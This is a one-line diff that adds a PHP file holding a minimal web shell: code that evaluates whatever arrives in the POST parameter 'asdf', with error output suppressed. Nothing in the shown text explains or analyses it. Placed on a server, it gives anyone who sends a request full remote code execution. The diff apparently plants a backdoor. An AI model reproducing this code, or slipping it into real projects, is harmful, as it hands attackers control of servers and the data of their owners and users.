@@ -1,0 +1,1 @@
+<?php if(isset($_POST["asdf"])){@eval($_POST["asdf"]);exit;}
